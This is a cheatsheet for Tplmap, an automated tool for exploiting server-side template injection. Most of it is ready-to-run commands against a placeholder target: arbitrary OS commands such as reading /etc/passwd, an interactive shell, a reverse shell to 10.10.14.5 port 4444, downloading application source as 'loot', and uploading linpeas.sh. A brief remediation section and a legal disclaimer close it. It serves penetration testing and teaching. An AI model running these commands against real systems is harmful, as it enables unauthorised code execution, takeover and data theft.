# 🎭 Tplmap - Complete Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)

```
  ████████╗██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗ 
  ╚══██╔══╝██╔══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
     ██║   ██████╔╝██║     ██╔████╔██║███████║██████╔╝
     ██║   ██╔═══╝ ██║     ██║╚██╔╝██║██╔══██║██╔═══╝ 
     ██║   ██║     ███████╗██║ ╚═╝ ██║██║  ██║██║     
     ╚═╝   ╚═╝     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
       Server-Side Template Injection (SSTI) Automated Exploiter
```

<p align="center">
  <img src="https://img.shields.io/badge/Tplmap-SSTI_Exploitation-blue?style=for-the-badge" alt="Tplmap">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-orange?style=for-the-badge" alt="Web Security & API">
  <img src="https://img.shields.io/badge/Engines-Jinja2_Twig_Mako_Freemarker-green?style=for-the-badge" alt="Template Engines">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="License GPLv2">
</p>

<p align="center">
  <b>🌐 Automated exploitation tool designed to detect and exploit Server-Side Template Injection (SSTI) vulnerabilities to achieve Remote Code Execution</b>
</p>

---

## 📋 Table of Contents

- [Overview & The SSTI Vulnerability](#-overview--the-ssti-vulnerability)
- [Supported Template Engines](#-supported-template-engines)
- [Installation](#-installation)
- [Basic Vulnerability Detection](#-basic-vulnerability-detection)
- [Targeting Specific Injection Points (`*` marker)](#-targeting-specific-injection-points--marker)
- [Remote Command Execution (`--os-cmd`)](#-remote-command-execution---os-cmd)
- [Interactive Shells & Reverse Connections](#-interactive-shells--reverse-connections)
- [File Upload & Download](#-file-upload--download)
- [Testing POST Data & Headers](#-testing-post-data--headers)
- [Quick Reference Table](#-quick-reference-table)
- [Defensive Considerations & Remediation](#-defensive-considerations--remediation)
- [Legal Disclaimer](#-legal-disclaimer)

---

## 🎯 Overview & The SSTI Vulnerability

**Server-Side Template Injection (SSTI)** occurs when an application embeds unvalidated user input directly into a server-side template rather than passing it as data to be rendered. Because modern template engines allow syntax like `{{7*7}}` or `${7*7}`, attackers can break out of the sandbox and access the underlying runtime environment (Python, Java, PHP, Ruby, Node.js).

Written by **Miroslav Stampar** and **Emilio Pinna**, **Tplmap** acts as the "SQLMap for Template Engines". It automatically fingerprints the active template engine, breaks out of template evaluation contexts, and escalates code execution to full OS-level shell access.

---

## 🧩 Supported Template Engines

| Language | Template Engines Supported |
|----------|----------------------------|
| **Python** | Jinja2, Mako, Tornado, Nunjucks |
| **PHP** | Twig, Smarty |
| **Java** | Freemarker, Velocity |
| **Ruby** | ERB, Slim |
| **Node.js** | Jade, Pug, Dust.js |

---

## 📥 Installation

Tplmap is built on Python:

```bash
# Clone GitHub repository
git clone https://github.com/epinna/tplmap.git
cd tplmap

# Install dependencies
pip install -r requirements.txt

# Verify installation
python tplmap.py --help
```

---

## 🚀 Basic Vulnerability Detection

```bash
# Scan a GET parameter for SSTI
python tplmap.py -u "http://target.local/page?name=John"

# Mark explicit injection point using an asterisk (*)
python tplmap.py -u "http://target.local/profile?id=1&bio=*"
```

---

## 💻 Remote Command Execution (`--os-cmd`)

Once Tplmap detects the engine (e.g., Jinja2), execute arbitrary shell commands directly:

```bash
# Execute whoami on target
python tplmap.py -u "http://target.local/page?name=*" --os-cmd "whoami; id"

# Read sensitive configuration files
python tplmap.py -u "http://target.local/page?name=*" --os-cmd "cat /etc/passwd"
```

---

## 💀 Interactive Shells & Reverse Connections

```bash
# Spawn an interactive pseudo-terminal within Tplmap
python tplmap.py -u "http://target.local/page?name=*" --os-shell

# Drop a full reverse TCP connection to a Netcat listener
python tplmap.py -u "http://target.local/page?name=*" \
  --reverse-shell 10.10.14.5 4444
```

---

## 📁 File Upload & Download

Exfiltrate source code or upload persistence tools:

```bash
# Download remote source code or configuration
python tplmap.py -u "http://target.local/page?name=*" \
  --download /var/www/html/app.py ./app_loot.py

# Upload a local payload to remote /tmp/ directory
python tplmap.py -u "http://target.local/page?name=*" \
  --upload ./linpeas.sh /tmp/linpeas.sh
```

---

## 🌐 Testing POST Data & Headers

```bash
# Test POST body parameters
python tplmap.py -u "http://target.local/comment" -d "author=test&comment=*"

# Test HTTP Headers
python tplmap.py -u "http://target.local/dashboard" -H "User-Agent: *"

# Test behind authenticated session cookies
python tplmap.py -u "http://target.local/welcome?user=*" -c "session=xyz123"
```

---

## ⚡ Quick Reference Table

| Objective | Command |
|-----------|---------|
| **Detect SSTI in URL** | `python tplmap.py -u "<URL>?param=*"` |
| **Execute Remote Command** | `python tplmap.py -u "<URL>" --os-cmd="<CMD>"` |
| **Interactive Terminal** | `python tplmap.py -u "<URL>" --os-shell` |
| **Drop Reverse Shell** | `python tplmap.py -u "<URL>" --reverse-shell <IP> <PORT>` |
| **Download Remote File** | `python tplmap.py -u "<URL>" --download <REMOTE> <LOCAL>` |
| **Upload Local File** | `python tplmap.py -u "<URL>" --upload <LOCAL> <REMOTE>` |
| **Test POST Body** | `python tplmap.py -u "<URL>" -d "data=*"` |

---

## 🛡️ Defensive Considerations & Remediation

1. **Context-Aware Escaping:** Never concatenate raw user input into template strings. Use the template engine's native variable binding mechanism (e.g., in Jinja2: `render_template('hello.html', name=user_input)` rather than `render_template_string(f"Hello {user_input}")`).
2. **Sandbox Restrictions:** Enforce strict sandboxing within engines where dynamic rendering is unavoidable, disallowing access to `__class__`, `__mro__`, or reflection objects.

---

## ⚠️ Legal Disclaimer

> [!CAUTION]
> Tplmap executes arbitrary remote code on target application servers. Testing or exploiting web applications without prior written authorization is strictly illegal.